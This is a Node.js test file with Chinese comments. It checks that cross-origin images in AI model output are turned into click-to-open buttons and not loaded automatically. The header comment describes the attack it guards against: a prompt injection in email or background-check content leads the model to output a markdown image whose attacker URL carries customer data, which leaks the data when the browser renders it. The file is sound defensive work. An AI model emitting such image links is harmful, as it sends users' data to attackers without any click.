/**
 * 审计 P1-E：模型消息里的跨源图片不能自动请求。
 * 攻击路径：背调/邮件内容提示注入 → 模型输出 ![](https://attacker/?d=客户数据)
 * → 浏览器渲染即外带，零点击。
 */
const test = require('node:test');
const assert = require('node:assert');
const { loadRegion } = require('./_extract');

const ORIGIN = 'http://127.0.0.1:9119';

function load() {
  return loadRegion(
    'remote-images',
    '{ _isRemoteImageSrc: _isRemoteImageSrc, neutralizeRemoteImages: neutralizeRemoteImages }',
    { location: { origin: ORIGIN, href: ORIGIN + '/trade' } },
  );
}

test('_isRemoteImageSrc 只拦跨源 http(s)', () => {
  const api = load();
  assert.strictEqual(api._isRemoteImageSrc('https://x.example/a.png?d=1'), true);
  assert.strictEqual(api._isRemoteImageSrc('//x.example/a.png'), true);
  assert.strictEqual(api._isRemoteImageSrc('/static/icons/lucide-x.svg'), false);
  assert.strictEqual(api._isRemoteImageSrc('data:image/png;base64,AAAA'), false);
  assert.strictEqual(api._isRemoteImageSrc('blob:http://127.0.0.1:9119/abc'), false);
  assert.strictEqual(api._isRemoteImageSrc(''), false);
});

test('neutralizeRemoteImages 把远程 img 换成点击加载按钮', () => {
  const api = load();
  const replaced = {};
  const holder = {
    replaceChild(node) { replaced.node = node; },
  };
  const img = {
    getAttribute(name) { return name === 'src' ? 'https://x.example/a.png?d=1' : 'alt text'; },
    parentNode: holder,
  };
  const root = { querySelectorAll() { return [img]; } };
  const created = [];
  const opened = [];

  global.document = {
    createElement(tag) {
      const el = {
        tagName: String(tag).toUpperCase(), className: '', type: '', textContent: '',
        onClick: null,
        addEventListener(type, fn) { if (type === 'click') this.onClick = fn; },
      };
      created.push(el);
      return el;
    },
  };
  global.window = { open(...args) { opened.push(args); } };
  try {
    api.neutralizeRemoteImages(root);
    // W7：点击后在新标签页打开链接，当前页绝不插入跨源 <img>（CSP 会裂图）
    assert.ok(replaced.node && replaced.node.onClick, '按钮没有绑定点击事件');
    replaced.node.onClick();
  } finally {
    delete global.document;
    delete global.window;
  }

  assert.ok(replaced.node, '远程图片没有被替换');
  assert.strictEqual(replaced.node.className, 'remote-img-hold');
  assert.match(replaced.node.textContent, /x\.example/);
  assert.strictEqual(opened.length, 1, '点击必须打开新标签页');
  assert.strictEqual(opened[0][0], 'https://x.example/a.png?d=1');
  assert.strictEqual(opened[0][1], '_blank');
  assert.match(String(opened[0][2] || ''), /noopener/);
  assert.ok(
    !created.some((el) => el.tagName === 'IMG'),
    '当前页不能插入跨源 <img>',
  );
});

test('同源图片保持原样', () => {
  const api = load();
  let replaced = false;
  const img = {
    getAttribute() { return '/static/icons/lucide-search.svg'; },
    parentNode: { replaceChild() { replaced = true; } },
  };
  global.document = { createElement() { throw new Error('不应创建占位'); } };
  try {
    api.neutralizeRemoteImages({ querySelectorAll() { return [img]; } });
  } finally {
    delete global.document;
  }
  assert.strictEqual(replaced, false);
});
